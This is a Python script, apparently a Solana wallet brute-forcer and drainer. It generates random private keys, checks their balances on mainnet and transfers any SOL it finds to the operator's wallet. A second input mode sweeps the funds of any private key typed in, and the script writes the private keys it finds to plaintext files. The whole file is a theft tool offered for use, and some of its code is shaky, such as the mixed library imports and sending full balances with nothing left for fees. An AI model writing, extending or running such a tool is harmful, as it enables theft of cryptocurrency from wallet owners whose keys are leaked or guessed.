import time
import os
import json
import base58
from nacl.signing import SigningKey  # For Ed25519 key generation
from solana.rpc.api import Client
from solana.publickey import Pubkey
from solana.transaction import Transaction
from solana.system_program import TransferParams, transfer
from solana.keypair import Keypair
from solana.exceptions import SolanaRpcException
import threading

# Load configuration from config.json
with open("config.json", "r") as config_file:
    config = json.load(config_file)

YOUR_WALLET = config["YOUR_WALLET"]
REQUEST_DELAY = config["REQUEST_DELAY"]

# Solana RPC endpoint
SOLANA_RPC = "https://api.mainnet-beta.solana.com"
client = Client(SOLANA_RPC)

# File to save wallet details
WALLET_LOG_FILE = "found_wallets.txt"
POTENTIAL_WALLET_FILE = "potential.txt"
COMMAND_OUTPUT_FILE = "output_command.txt"

# Flag to pause/resume the main loop
pause_generation = False

def generate_ed25519_keypair():
    """Generate a random Ed25519 keypair and return the private key as Base58."""
    # Generate a random 32-byte seed for the private key
    seed = os.urandom(32)
    
    # Create an Ed25519 signing key from the seed
    signing_key = SigningKey(seed)
    
    # Get the private key (seed + public key, 64 bytes total)
    private_key = signing_key._signing_key
    
    # Encode the private key in Base58
    private_key_base58 = base58.b58encode(private_key).decode('utf-8')
    
    return private_key_base58

def base58_to_ed25519_keypair(private_key_base58):
    """Convert a Base58-encoded Ed25519 private key to a Keypair."""
    try:
        # Decode the Base58 private key into bytes
        private_key_bytes = base58.b58decode(private_key_base58)
        
        # Ensure the private key is 64 bytes (Ed25519 format)
        if len(private_key_bytes) != 64:
            raise ValueError("Invalid Ed25519 private key length. Expected 64 bytes.")
        
        # Create a Keypair from the decoded bytes
        keypair = Keypair.from_secret_key(private_key_bytes)
        return keypair
    except Exception as e:
        print(f"Error decoding private key: {e}")
        return None

def private_key_to_wallet(private_key):
    """Convert a private key to a Solana wallet address."""
    if isinstance(private_key, str):
        # If the private key is a Base58 string, decode it first
        keypair = base58_to_ed25519_keypair(private_key)
    else:
        # If the private key is already bytes, create a Keypair directly
        keypair = Keypair.from_secret_key(private_key)
    return str(keypair.public_key), keypair

def check_wallet_balance(wallet_address):
    """Check the balance of a Solana wallet in SOL."""
    try:
        pubkey = Pubkey.from_string(wallet_address)
        balance_response = client.get_balance(pubkey)
        balance_lamports = balance_response.value if balance_response else 0
        balance_sol = balance_lamports / 1_000_000_000  # Convert lamports to SOL
        return balance_sol
    except SolanaRpcException as e:
        print(f"RPC error checking balance for {wallet_address}: {e}")
        return 0
    except Exception as e:
        print(f"Unexpected error checking balance for {wallet_address}: {e}")
        return 0

def check_wallet_transactions(wallet_address):
    """Check if the wallet has any transactions."""
    try:
        pubkey = Pubkey.from_string(wallet_address)
        transactions_response = client.get_signatures_for_address(pubkey)
        return bool(transactions_response.value)  # True if transactions exist
    except SolanaRpcException as e:
        print(f"RPC error checking transactions for {wallet_address}: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error checking transactions for {wallet_address}: {e}")
        return False

def send_sol(sender_keypair, recipient_wallet, amount_sol):
    """Send SOL from one wallet to another."""
    try:
        amount_lamports = int(amount_sol * 1_000_000_000)  # Convert SOL to lamports
        txn = Transaction().add(transfer(TransferParams(
            from_pubkey=sender_keypair.public_key,
            to_pubkey=Pubkey.from_string(recipient_wallet),
            lamports=amount_lamports
        )))
        client.send_transaction(txn, sender_keypair)
        print(f"Sent {amount_sol} SOL to {recipient_wallet}.")
        return True
    except Exception as e:
        print(f"Failed to send SOL: {e}")
        return False

def log_wallet_details(private_key, wallet_address, balance_sol, has_transactions=False):
    """Log wallet details to a text file."""
    with open(WALLET_LOG_FILE, "a") as f:
        f.write(f"Private Key: {private_key}\n")
        f.write(f"Wallet Address: {wallet_address}\n")
        f.write(f"Balance: {balance_sol} SOL\n")
        f.write("-" * 40 + "\n")
    
    # Log to potential.txt if the wallet has transactions
    if has_transactions:
        with open(POTENTIAL_WALLET_FILE, "a") as f:
            f.write(f"Private Key: {private_key}\n")
            f.write(f"Wallet Address: {wallet_address}\n")
            f.write(f"Balance: {balance_sol} SOL\n")
            f.write("-" * 40 + "\n")

def check_wallet_command(private_key):
    """Check a wallet using a private key and save the output."""
    global pause_generation
    pause_generation = True  # Pause the main loop

    # Convert the private key to a wallet address
    wallet_address, keypair = private_key_to_wallet(private_key)
    if not keypair:
        output = "Invalid private key.\n"
    else:
        # Check the wallet balance
        balance_sol = check_wallet_balance(wallet_address)
        # Check for transactions
        has_transactions = check_wallet_transactions(wallet_address)
        # Prepare the output
        output = (
            f"Wallet Address: {wallet_address}\n"
            f"Balance: {balance_sol} SOL\n"
            f"Has Transactions: {has_transactions}\n"
        )
        
        # Transfer SOL to your wallet
        if balance_sol > 0:
            if send_sol(keypair, YOUR_WALLET, balance_sol):
                output += f"Transferred {balance_sol} SOL to your wallet.\n"
        
        # Log to potential.txt if the wallet has transactions
        if has_transactions:
            log_wallet_details(private_key, wallet_address, balance_sol, has_transactions=True)
    
    # Save the output to output_command.txt
    with open(COMMAND_OUTPUT_FILE, "a") as f:
        f.write(output)
        f.write("-" * 40 + "\n")
    
    print(output)
    time.sleep(10)  # Sleep for 10 seconds
    pause_generation = False  # Resume the main loop

def main():
    def input_thread():
        """Thread to handle user input."""
        while True:
            private_key = input("Enter a private key to check (or 'exit' to quit): ")
            if private_key.lower() == "exit":
                os._exit(0)  # Exit the program
            check_wallet_command(private_key)

    # Start the input thread
    threading.Thread(target=input_thread, daemon=True).start()

    try:
        while True:
            if pause_generation:
                time.sleep(1)  # Wait while paused
                continue

            # Generate a random Base58-encoded Ed25519 private key
            private_key_base58 = generate_ed25519_keypair()
            print(f"Generated Private Key: {private_key_base58}")
            
            # Convert the private key to a wallet address
            wallet_address, keypair = private_key_to_wallet(private_key_base58)
            if not keypair:
                print("Invalid private key. Skipping...")
                continue

            # Check the wallet balance
            balance_sol = check_wallet_balance(wallet_address)
            # Check for transactions
            has_transactions = check_wallet_transactions(wallet_address)

            if balance_sol > 0:
                print(f"Found wallet with balance: {wallet_address} (Balance: {balance_sol} SOL)")
                
                # Log wallet details to file
                log_wallet_details(private_key_base58, wallet_address, balance_sol, has_transactions)
                
                # Send funds to your wallet
                send_sol(keypair, YOUR_WALLET, balance_sol)
            else:
                print(f"Wallet {wallet_address} is empty.")

            # Add a delay to avoid rate limiting
            time.sleep(REQUEST_DELAY)
    except KeyboardInterrupt:
        print("\nScript stopped by user. Exiting gracefully...")

if __name__ == "__main__":
    main()